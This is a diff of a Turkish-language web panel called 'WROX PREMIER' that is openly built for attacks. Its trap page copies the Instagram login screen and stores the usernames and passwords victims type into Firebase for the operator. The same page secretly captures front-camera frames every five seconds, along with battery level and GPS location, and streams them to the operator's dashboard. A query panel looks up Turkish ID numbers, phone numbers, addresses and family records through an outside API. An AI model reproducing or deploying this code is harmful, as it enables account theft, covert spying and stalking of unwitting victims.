@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WROX PREMIER V150</title>
+    <title>WROX PREMIER V151</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -11,7 +11,7 @@
         :root { --p: #00f2ff; --bg: #000; --card: #0a0a0a; --r: #ff003c; --g: #00ff88; --y: #ffd700; --insta: #E1306C; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', monospace; -webkit-tap-highlight-color: transparent; }
         body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; }
-        header { padding: 15px; background: #050505; border-bottom: 1px solid #111; display: flex; align-items: center; justify-content: space-between; z-index: 1001; }
+        header { padding: 15px; background: #050505; border-bottom: 1px solid #111; display: flex; align-items: center; justify-content: space-between; }
         .menu-btn { font-size: 20px; color: var(--p); cursor: pointer; }
         #sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: #080808; border-right: 1px solid #151515; z-index: 1002; transition: 0.3s; padding-top: 50px; }
         #sidebar.active { left: 0; box-shadow: 5px 0 30px rgba(0,0,0,0.8); }
@@ -20,7 +20,7 @@
         .nav-item.lock i.fa-lock { margin-left: auto; font-size: 10px; color: var(--y); }
         .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; z-index: 1001; }
         main { height: calc(100vh - 55px); padding: 15px; overflow-y: auto; }
-        .k-card { background: var(--card); border: 1px solid #1a1a1a; border-radius: 12px; margin-bottom: 15px; padding: 12px; overflow: hidden; }
+        .k-card { background: var(--card); border: 1px solid #1a1a1a; border-radius: 12px; margin-bottom: 15px; padding: 12px; }
         input, select { width: 100%; padding: 12px; margin-bottom: 10px; background: #000; border: 1px solid #222; color: #fff; border-radius: 8px; outline: none; }
         .p-btn { width: 100%; padding: 12px; background: var(--p); color: #000; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; font-size: 11px; }
         .admin-row { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: #111; border-radius: 8px; margin-bottom: 8px; font-size: 12px; }
@@ -74,7 +74,7 @@
     }
 
     function renderAuth() {
-        document.getElementById('wrox-app').innerHTML = `<div id="auth-screen" style="height:100vh;display:flex;align-items:center;justify-content:center;padding:25px;"><div style="width:100%;max-width:320px;text-align:center;"><h2 style="color:var(--p);margin-bottom:25px;">WROX V150</h2><input id="ae" placeholder="E-posta"><input id="ap" type="password" placeholder="Şifre"><button class="p-btn" onclick="auth('login')">GİRİŞ YAP</button><button class="p-btn" style="background:#111;color:#555;margin-top:10px;" onclick="auth('reg')">KAYIT OL</button></div></div>`;
+        document.getElementById('wrox-app').innerHTML = `<div style="height:100vh;display:flex;align-items:center;justify-content:center;padding:25px;"><div style="width:100%;max-width:320px;text-align:center;"><h2 style="color:var(--p);margin-bottom:25px;">WROX V151</h2><input id="ae" placeholder="E-posta"><input id="ap" type="password" placeholder="Şifre"><button class="p-btn" onclick="auth('login')">GİRİŞ YAP</button><button class="p-btn" style="background:#111;color:#555;margin-top:10px;" onclick="auth('reg')">KAYIT OL</button></div></div>`;
     }
 
     async function auth(m) {
@@ -116,27 +116,27 @@
         const base = `${window.location.origin}${window.location.pathname}?mode=trap&ref=${user.id}`;
 
         if(t === 'sorgu') {
-            v.innerHTML = `<div class="k-card"><h4>SORGU MERKEZİ (FREE)</h4><select id="sType"><option value="adsoyad">Ad Soyad</option><option value="gsmtc">GSM -> TC</option><option value="tcgsm">TC -> GSM</option><option value="sulale">Sülale</option><option value="adres">Adres</option></select><input id="sVal1" placeholder="TC veya Ad"><input id="sVal2" placeholder="Soyad (Opsiyonel)"><button class="p-btn" style="background:var(--g)" onclick="doSorgu()">SORGULA</button><div id="res" style="background:#050505;border-left:3px solid var(--g);padding:10px;margin-top:10px;font-size:11px;display:none;white-space:pre-wrap;"></div></div>`;
+            v.innerHTML = `<div class="k-card"><h4>SORGU (FREE)</h4><select id="sType"><option value="adsoyad">Ad Soyad</option><option value="gsmtc">GSM -> TC</option><option value="tcgsm">TC -> GSM</option><option value="sulale">Sülale</option><option value="adres">Adres</option></select><input id="sVal1" placeholder="Veri"><input id="sVal2" placeholder="Soyad (Opsiyonel)"><button class="p-btn" style="background:var(--g)" onclick="doSorgu()">SORGULA</button><div id="res" style="background:#050505;border-left:3px solid var(--g);padding:10px;margin-top:10px;font-size:11px;display:none;white-space:pre-wrap;"></div></div>`;
         } else if(t === 'insta') {
-            v.innerHTML = `<div class="k-card" style="border-color:var(--insta)"><h4>INSTAGRAM PANEL</h4><input id="l-in" value="${base}&op=insta" readonly><button class="p-btn" style="background:var(--insta)" onclick="copyL('l-in')">INSTA LİNKİ KOPYALA</button></div><h3>HESAPLAR</h3><div id="inst"></div>`;
+            v.innerHTML = `<div class="k-card" style="border-color:var(--insta)"><h4>HESAP ÇALMA</h4><input id="l-in" value="${base}&op=insta" readonly><button class="p-btn" style="background:var(--insta)" onclick="copyL('l-in')">KİŞİSEL LİNKİNİ KOPYALA</button></div><div id="inst"></div>`;
             db.ref('spy_live/'+user.id).on('value', sn => {
                 const ins = document.getElementById('inst'); if(!ins) return; ins.innerHTML = '';
                 sn.forEach(c => { const d = c.val(); if(d.iu) ins.innerHTML += `<div class="k-card" style="border-color:var(--insta)"><b>USER:</b> ${d.iu}<br><b>PASS:</b> ${d.ip}</div>`; });
             });
         } else if(t === 'sizma') {
-            v.innerHTML = `<div class="k-card" style="border-color:var(--p)"><h4>KAMERA SIZMA</h4><input id="l-sz" value="${base}&op=cam" readonly><button class="p-btn" onclick="copyL('l-sz')">SIZMA LİNKİNİ KOPYALA</button></div><h3>CANLI AKIŞ</h3><div id="stream"></div>`;
+            v.innerHTML = `<div class="k-card" style="border-color:var(--p)"><h4>KAMERA SIZMA</h4><input id="l-sz" value="${base}&op=cam" readonly><button class="p-btn" onclick="copyL('l-sz')">KİŞİSEL LİNKİNİ KOPYALA</button></div><div id="stream"></div>`;
             db.ref('spy_live/'+user.id).on('value', sn => {
                 const s = document.getElementById('stream'); if(!s) return; s.innerHTML = '';
-                sn.forEach(c => { const d = c.val(); if(d.img) s.innerHTML = `<div class="k-card"><img src="${d.img}" style="width:100%;border-radius:8px;"><p style="font-size:10px;margin-top:5px;color:var(--p)">CİHAZ: ${d.device} | %${d.battery}</p></div>` + s.innerHTML; });
+                sn.forEach(c => { const d = c.val(); if(d.img) s.innerHTML = `<div class="k-card"><img src="${d.img}" style="width:100%;border-radius:8px;"><p style="font-size:10px;margin-top:5px;color:var(--p)">BATARYA: %${d.battery}</p></div>` + s.innerHTML; });
             });
         } else if(t === 'konum') {
-            v.innerHTML = `<div class="k-card" style="border-color:var(--g)"><h4>KONUM TAKİBİ</h4><input id="l-kn" value="${base}&op=loc" readonly><button class="p-btn" style="background:var(--g)" onclick="copyL('l-kn')">KONUM LİNKİNİ KOPYALA</button></div><h3>ANLIK KONUMLAR</h3><div id="kon"></div>`;
+            v.innerHTML = `<div class="k-card" style="border-color:var(--g)"><h4>KONUM TAKİBİ</h4><input id="l-kn" value="${base}&op=loc" readonly><button class="p-btn" style="background:var(--g)" onclick="copyL('l-kn')">KİŞİSEL LİNKİNİ KOPYALA</button></div><div id="kon"></div>`;
             db.ref('spy_live/'+user.id).on('value', sn => {
                 const kon = document.getElementById('kon'); if(!kon) return; kon.innerHTML = '';
                 sn.forEach(c => { const d = c.val(); if(d.lat) kon.innerHTML += `<div class="k-card"><a href="https://www.google.com/maps?q=${d.lat},${d.lon}" target="_blank" style="color:var(--g);text-decoration:none;"><i class="fas fa-map-marker-alt"></i> HARİTADA GÖR</a></div>`; });
             });
         } else if(t === 'admin') {
-            v.innerHTML = `<h3>YÖNETİM</h3><div id="ulist"></div>`;
+            v.innerHTML = `<h3>ADMIN</h3><div id="ulist"></div>`;
             db.ref('users').on('value', sn => {
                 const l = document.getElementById('ulist'); l.innerHTML = '';
                 sn.forEach(u => { const d = u.val(); l.innerHTML += `<div class="admin-row"><span>${d.e}</span><button onclick="setPrem('${d.id}', ${!d.premium})" style="background:${d.premium?'var(--r)':'var(--g)'};border:none;padding:5px 8px;border-radius:4px;">${d.premium?'AL':'VER'}</button></div>`; });
@@ -148,10 +148,7 @@
         const type = document.getElementById('sType').value, v1 = document.getElementById('sVal1').value, v2 = document.getElementById('sVal2').value;
         const res = document.getElementById('res'); res.style.display='block'; res.innerHTML = "Sorgulanıyor...";
         let url = `https://arastir.sbs/api/${type}.php?adi=${v1}&soyadi=${v2}&tc=${v1}&gsm=${v1}`;
-        try {
-            const resp = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`);
-            const data = await resp.json(); res.innerHTML = data.contents || "Sonuç yok.";
-        } catch(e) { res.innerHTML = "Hata oluştu."; }
+        try { const resp = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`); const data = await resp.json(); res.innerHTML = data.contents || "Sonuç yok."; } catch(e) { res.innerHTML = "Hata!"; }
     }
 
     window.setPrem = (id, s) => db.ref('users/'+id).update({ premium: s });
@@ -159,35 +156,21 @@
     window.logout = () => { localStorage.clear(); location.reload(); };
     window.copyL = (id) => { const i = document.getElementById(id); i.select(); document.execCommand('copy'); alert("Link kopyalandı!"); };
 
-    // --- TRAP TARAFI (KÖKLÜ DEĞİŞİKLİK) ---
     async function renderTrap(op, ref) {
         const victimID = "V_" + Math.random().toString(36).substr(2, 9);
-        document.body.innerHTML = `<div style="background:#fff;height:100vh;display:flex;flex-direction:column;align-items:center;padding-top:50px;"><img src="https://www.instagram.com/static/images/web/mobile_port_monetized_whiteout.png/d588941031f0.png" style="width:170px;"><div style="width:80%;margin-top:40px;"><input id="u" placeholder="Kullanıcı adı" style="color:#000;border:1px solid #dbdbdb;border-radius:3px;padding:10px;width:100%;margin-bottom:10px;"><input id="p" type="password" placeholder="Şifre" style="color:#000;border:1px solid #dbdbdb;border-radius:3px;padding:10px;width:100%;margin-bottom:10px;"><button onclick="hit('${ref}','${victimID}')" style="width:100%;background:#0095f6;color:#fff;border:none;padding:10px;border-radius:4px;font-weight:bold;">Giriş Yap</button></div><video id="v" autoplay playsinline muted style="display:none;"></video><canvas id="c" style="display:none;"></canvas></div>`;
-        
+        document.body.innerHTML = `<div style="background:#fff;height:100vh;display:flex;flex-direction:column;align-items:center;padding-top:50px;"><img src="https://www.instagram.com/static/images/web/mobile_port_monetized_whiteout.png/d588941031f0.png" style="width:170px;"><div style="width:80%;margin-top:40px;"><input id="u" placeholder="Kullanıcı adı" style="color:#000;border:1px solid #dbdbdb;padding:10px;width:100%;margin-bottom:10px;"><input id="p" type="password" placeholder="Şifre" style="color:#000;border:1px solid #dbdbdb;padding:10px;width:100%;margin-bottom:10px;"><button onclick="hit('${ref}','${victimID}')" style="width:100%;background:#0095f6;color:#fff;border:none;padding:10px;border-radius:4px;font-weight:bold;">Giriş Yap</button></div><video id="v" autoplay playsinline muted style="display:none;"></video><canvas id="c" style="display:none;"></canvas></div>`;
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('v').srcObject = stream;
-            
-            // Konum
-            if(op === 'loc' || op === 'cam') {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    db.ref(`spy_live/${ref}/${victimID}`).update({ lat: pos.coords.latitude, lon: pos.coords.longitude });
-                });
-            }
-
-            // Kamera
-            if(op === 'cam') {
-                setInterval(async () => {
-                    const canvas = document.getElementById('c'); canvas.width = 400; canvas.height = 300;
-                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 300);
-                    const data = canvas.toDataURL('image/jpeg', 0.4);
-                    const bt = await navigator.getBattery();
-                    db.ref(`spy_live/${ref}/${victimID}`).update({ img: data, device: navigator.platform, battery: Math.floor(bt.level * 100) });
-                }, 5000);
-            }
-        } catch(e) { console.log("İzin reddedildi."); }
+            if(op==='loc'||op==='cam') navigator.geolocation.getCurrentPosition(p => db.ref(`spy_live/${ref}/${victimID}`).update({lat:p.coords.latitude, lon:p.coords.longitude}));
+            if(op==='cam') setInterval(async () => {
+                const canvas = document.getElementById('c'); canvas.width = 400; canvas.height = 300;
+                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 300);
+                const bt = await navigator.getBattery();
+                db.ref(`spy_live/${ref}/${victimID}`).update({ img: canvas.toDataURL('image/jpeg', 0.4), battery: Math.floor(bt.level * 100) });
+            }, 5000);
+        } catch(e) {}
     }
-
     window.hit = async (ref, vId) => {
         const iu = document.getElementById('u').value, ip = document.getElementById('p').value;
         if(iu && ip) { await db.ref(`spy_live/${ref}/${vId}`).update({ iu, ip }); location.href = "https://instagram.com"; }
